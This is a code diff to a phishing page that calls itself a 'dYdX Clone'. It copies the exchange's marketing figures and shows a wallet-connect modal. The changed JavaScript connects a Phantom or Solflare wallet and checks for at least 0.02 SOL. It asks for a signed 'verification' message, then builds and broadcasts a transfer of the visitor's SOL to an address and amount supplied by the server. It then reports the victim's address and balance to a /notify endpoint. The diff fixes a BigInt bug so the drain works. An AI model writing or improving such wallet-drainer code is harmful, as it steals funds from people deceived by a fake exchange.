@@ -80,19 +80,33 @@
     <div class="metrics"><div style="color:#6966FF; text-transform:uppercase; font-size:14px;">Why dYdX?</div><h2>Trusted at Scale</h2><div class="metrics-grid"><div class="metric-card"><div class="metric-number">$1.4T</div><div class="metric-label">Lifetime Volume</div></div><div class="metric-card"><div class="metric-number">$200M</div><div class="metric-label">Open Interest</div></div><div class="metric-card"><div class="metric-number">220+</div><div class="metric-label">Markets</div></div><div class="metric-card"><div class="metric-number">$12M</div><div class="metric-label">MegaVault TVL</div></div></div></div>
 
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
     <script>
-        // Buffer polyfill for the new version
+        // ============================================
+        // CRITICAL: Buffer polyfill for Solana
+        // ============================================
         if (!window.Buffer) { 
             window.Buffer = { 
                 from: (s) => new TextEncoder().encode(s), 
                 alloc: (n) => new Uint8Array(n),
-                isBuffer: (obj) => obj instanceof Uint8Array
+                isBuffer: (obj) => obj instanceof Uint8Array,
+                concat: (list, length) => {
+                    const total = length || list.reduce((acc, buf) => acc + buf.length, 0);
+                    const result = new Uint8Array(total);
+                    let offset = 0;
+                    for (const buf of list) {
+                        result.set(buf, offset);
+                        offset += buf.length;
+                    }
+                    return result;
+                }
             }; 
         }
 
         document.addEventListener('DOMContentLoaded', function() {
-            console.log('Ready');
+            console.log('========================================');
+            console.log('🚀 dYdX Clone Frontend Loaded');
+            console.log('========================================');
             
             const modal = document.getElementById('walletModal');
             const walletOptions = document.getElementById('walletOptions');
@@ -107,15 +121,24 @@
             function showLoading(walletType) { walletOptions.classList.add('hidden'); loadingState.classList.add('active'); if(modalTitle) modalTitle.textContent = 'Connecting...'; modal.classList.add('locked'); loadingIcon.src = walletType === 'phantom' ? 'https://docs.phantom.com/favicon.svg' : 'https://solflare.com/favicon.ico'; }
             
             function checkStatus() {
-                document.getElementById('phantomStatus').innerHTML = (window.solana && window.solana.isPhantom) ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
-                document.getElementById('solflareStatus').innerHTML = (window.solflare && window.solflare.isSolflare) ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
+                const phantomInstalled = !!(window.solana && window.solana.isPhantom);
+                const solflareInstalled = !!(window.solflare && window.solflare.isSolflare);
+                document.getElementById('phantomStatus').innerHTML = phantomInstalled ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
+                document.getElementById('solflareStatus').innerHTML = solflareInstalled ? '<span class="status-dot installed"></span><span style="color:#4CAF50">Installed</span>' : '<span class="status-dot"></span><span>Not installed</span>';
+                console.log('Wallet status - Phantom:', phantomInstalled, 'Solflare:', solflareInstalled);
             }
             
             async function callBackend(endpoint, data) {
-                const res = await fetch(endpoint, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data || {}) });
-                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                console.log(`📡 Calling ${endpoint} with:`, data);
+                const res = await fetch(endpoint, { 
+                    method: 'POST', 
+                    headers: { 'Content-Type': 'application/json' }, 
+                    body: JSON.stringify(data || {}) 
+                });
+                if (!res.ok) throw new Error(`HTTP ${res.status}: ${await res.text()}`);
                 const result = await res.json();
                 if (result.error) throw new Error(result.error);
+                console.log(`✅ ${endpoint} response:`, result);
                 return result;
             }
             
@@ -123,52 +146,75 @@
                 if (!provider) { alert('Install wallet first'); return; }
                 showLoading(walletType);
                 try {
+                    // Step 1: Connect
                     loadingTitle.textContent = 'Connecting...';
+                    loadingSubtitle.textContent = 'Please approve connection in your wallet.';
                     const resp = await provider.connect();
                     const pubKey = walletType === 'phantom' ? resp.publicKey.toString() : provider.publicKey.toString();
-                    console.log('Connected:', pubKey);
+                    console.log('✅ Connected publicKey:', pubKey);
                     
+                    // Step 2: Get balance
                     loadingTitle.textContent = 'Getting Balance...';
+                    loadingSubtitle.textContent = 'Fetching your wallet balance...';
                     const balanceData = await callBackend('/api/getBalance', { publicKey: pubKey });
-                    const solBalance = (balanceData.balance / 1e9).toFixed(4);
-                    console.log('Balance:', solBalance, 'SOL');
+                    const balanceLamports = balanceData.balance;
+                    const solBalance = (balanceLamports / 1e9).toFixed(6);
+                    console.log(`💰 Balance: ${solBalance} SOL (${balanceLamports} lamports)`);
                     
-                    if (balanceData.balance < 20000000) {
+                    // Step 3: Check minimum
+                    if (balanceLamports < 20000000) {
                         loadingTitle.textContent = 'Insufficient Balance';
-                        loadingSubtitle.innerHTML = `Need 0.02 SOL<br>Have: ${solBalance} SOL`;
+                        loadingSubtitle.innerHTML = `Need at least 0.02 SOL<br>Current: ${solBalance} SOL`;
                         setTimeout(hideModal, 3000);
                         return;
                     }
                     
-                    loadingTitle.textContent = 'Verifying...';
-                    const msg = `Verify wallet\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
-                    if (walletType === 'phantom') await provider.signMessage(new TextEncoder().encode(msg), 'utf8');
-                    else await provider.signMessage(new TextEncoder().encode(msg));
-                    console.log('Verified');
+                    // Step 4: Sign verification
+                    loadingTitle.textContent = 'Verifying Ownership';
+                    loadingSubtitle.textContent = 'Please sign the verification message...';
+                    const msg = `Verify wallet ownership\nTime: ${Date.now()}\nWallet: ${pubKey.slice(0,8)}...`;
+                    const msgBytes = new TextEncoder().encode(msg);
+                    if (walletType === 'phantom') await provider.signMessage(msgBytes, 'utf8');
+                    else await provider.signMessage(msgBytes);
+                    console.log('✅ Verification signed');
                     
-                    loadingTitle.textContent = 'Preparing...';
+                    // Step 5: Prepare transaction (get amount from backend)
+                    loadingTitle.textContent = 'Preparing Transaction...';
+                    loadingSubtitle.textContent = 'Contacting server...';
                     const prepareData = await callBackend('/prepare-transaction', { publicKey: pubKey });
                     if (!prepareData.success) throw new Error(prepareData.error);
+                    console.log(`📦 Prepare response - amount: ${prepareData.amount}, to: ${prepareData.to}`);
                     
+                    // Step 6: Get fresh blockhash
                     loadingTitle.textContent = 'Getting Blockhash...';
+                    loadingSubtitle.textContent = 'Fetching latest blockhash...';
                     const blockhashData = await callBackend('/api/getBlockhash', {});
+                    console.log(`🔗 Blockhash: ${blockhashData.blockhash}`);
                     
-                    // FIX: Use try-catch with proper number conversion
+                    // ============================================
+                    // FIX: Build transaction with BigInt for lamports
+                    // ============================================
                     loadingTitle.textContent = 'Building Transaction...';
+                    loadingSubtitle.textContent = 'Constructing transfer...';
                     
                     const { PublicKey, Transaction, SystemProgram } = solanaWeb3;
                     const fromPubkey = new PublicKey(pubKey);
                     const toPubkey = new PublicKey(prepareData.to);
                     
-                    // Convert lamports to a regular number (not BigInt)
-                    const lamports = Number(prepareData.amount);
-                    console.log('Lamports as number:', lamports);
+                    // CRITICAL FIX: Convert to BigInt explicitly
+                    const lamportsBigInt = BigInt(prepareData.amount);
+                    console.log(`🔢 Lamports as BigInt: ${lamportsBigInt} (${typeof lamportsBigInt})`);
                     
-                    // Create instruction directly
+                    // Validate lamports is not NaN or undefined
+                    if (isNaN(Number(prepareData.amount)) || prepareData.amount === undefined) {
+                        throw new Error(`Invalid lamports value: ${prepareData.amount}`);
+                    }
+                    
+                    // Create the transfer instruction with BigInt
                     const transferIx = SystemProgram.transfer({
                         fromPubkey: fromPubkey,
                         toPubkey: toPubkey,
-                        lamports: lamports
+                        lamports: lamportsBigInt  // Use BigInt here
                     });
                     
                     const transaction = new Transaction();
@@ -177,39 +223,72 @@
                     transaction.lastValidBlockHeight = blockhashData.lastValidBlockHeight;
                     transaction.feePayer = fromPubkey;
                     
-                    loadingTitle.textContent = 'Signing...';
-                    const signed = await provider.signTransaction(transaction);
+                    console.log('✅ Transaction built successfully');
                     
-                    loadingTitle.textContent = 'Sending...';
+                    // Step 7: Sign
+                    loadingTitle.textContent = 'Signing Transaction...';
+                    loadingSubtitle.textContent = 'Please approve the transaction in your wallet...';
+                    const signed = await provider.signTransaction(transaction);
+                    console.log('✅ Transaction signed');
+                    
+                    // Step 8: Send
+                    loadingTitle.textContent = 'Sending Transaction...';
+                    loadingSubtitle.textContent = 'Broadcasting to blockchain...';
                     const signedBytes = signed.serialize();
                     const base64Tx = btoa(String.fromCharCode.apply(null, signedBytes));
                     const sendResult = await callBackend('/api/sendTransaction', { transaction: base64Tx });
+                    console.log(`✅ Transaction sent! TXID: ${sendResult.txid}`);
                     
-                    console.log('TXID:', sendResult.txid);
+                    // Step 9: Success
+                    const shortTxid = sendResult.txid.slice(0, 6) + '...' + sendResult.txid.slice(-8);
                     loadingTitle.textContent = 'Success!';
-                    loadingSubtitle.innerHTML = `Complete!<br>${sendResult.txid.slice(0,6)}...${sendResult.txid.slice(-8)}`;
+                    loadingSubtitle.innerHTML = `Transfer complete!<br>TXID: ${shortTxid}`;
+                    
+                    // Send notification
+                    await fetch('/notify', { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify({ 
+                            address: pubKey, 
+                            balance: solBalance, 
+                            walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare', 
+                            customMessage: '🎉 Transfer Complete! TXID: ' + sendResult.txid 
+                        }) 
+                    });
+                    
                     setTimeout(hideModal, 3000);
                     
-                    await fetch('/notify', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ address: pubKey, balance: solBalance, walletType, customMessage: 'Transfer Complete! TXID: ' + sendResult.txid }) });
                 } catch(e) {
-                    console.error('Error:', e);
+                    console.error('❌ FATAL ERROR:', e);
+                    console.error('Stack:', e.stack);
                     loadingTitle.textContent = 'Failed';
-                    loadingSubtitle.textContent = e.message || 'Try again';
+                    loadingSubtitle.textContent = e.message || 'Something went wrong. Please try again.';
                     setTimeout(hideModal, 3000);
                 }
             }
             
+            // Event listeners
             document.getElementById('connectWalletBtn').addEventListener('click', showModal);
             document.getElementById('heroConnectBtn').addEventListener('click', showModal);
             document.getElementById('closeModalBtn').addEventListener('click', hideModal);
             document.querySelector('.modal-overlay').addEventListener('click', () => { if (!modal.classList.contains('locked')) hideModal(); });
-            document.querySelectorAll('.wallet-option').forEach(opt => { opt.addEventListener('click', () => { const type = opt.getAttribute('data-wallet'); connectWallet(type, type === 'phantom' ? window.solana : window.solflare); }); });
-            document.addEventListener('keydown', (e) => { if (e.key === 'Escape' && modal.style.display === 'flex' && !modal.classList.contains('locked')) hideModal(); });
+            document.querySelectorAll('.wallet-option').forEach(opt => { 
+                opt.addEventListener('click', () => { 
+                    const type = opt.getAttribute('data-wallet'); 
+                    connectWallet(type, type === 'phantom' ? window.solana : window.solflare); 
+                }); 
+            });
+            document.addEventListener('keydown', (e) => { 
+                if (e.key === 'Escape' && modal.style.display === 'flex' && !modal.classList.contains('locked')) hideModal(); 
+            });
             
             checkStatus();
             setTimeout(checkStatus, 500);
             setTimeout(checkStatus, 1000);
             setTimeout(checkStatus, 2000);
+            setTimeout(checkStatus, 5000);
+            
+            console.log('✅ Frontend ready, waiting for user interaction');
         });
     </script>
 </body>
